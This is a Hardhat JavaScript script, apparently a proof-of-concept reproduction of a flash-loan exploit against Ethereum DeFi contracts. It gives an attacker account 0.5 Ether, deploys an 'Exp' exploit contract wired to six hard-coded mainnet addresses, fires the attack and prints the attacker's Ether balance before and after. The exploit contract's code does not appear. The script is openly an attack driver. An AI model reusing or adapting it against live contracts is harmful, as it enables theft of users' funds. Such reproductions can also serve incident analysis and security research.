// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {
  const [hacker] = await hre.ethers.getSigners();

  await ethers.provider.send("hardhat_setBalance", [
    hacker.address,
    "0x6f05b59d3b20000", // 0.5 Ether
  ]);

  const Exp = await hre.ethers.getContractFactory("Exp", hacker);
  const exp = await Exp.deploy("0xBA12222222228d8Ba445958a75a0704d566BF2C8", "0x2F131C4DAd4Be81683ABb966b4DE05a549144443", "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xEBe72CDafEbc1abF26517dd64b28762DF77912a9");

  await exp.deployed();

  console.log("[#] 🧛 Exploiter deployed to:", exp.address)

  console.log("[#] 🥷  Start Attack...")

  console.log("[#] 🥷  Are lending out Flash Loan...")

  const before = await ethers.provider.getBalance(hacker.address);

  console.log("[#] 🧛 The hacker's Ether balance before the attack was launched:", hre.ethers.utils.formatEther(before.toString()))

  await exp.trigger();

  const after = await ethers.provider.getBalance(hacker.address);

  console.log("[#] 🧛 The hacker's Ether balance after the attack was launched:", hre.ethers.utils.formatEther(after.toString()))

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
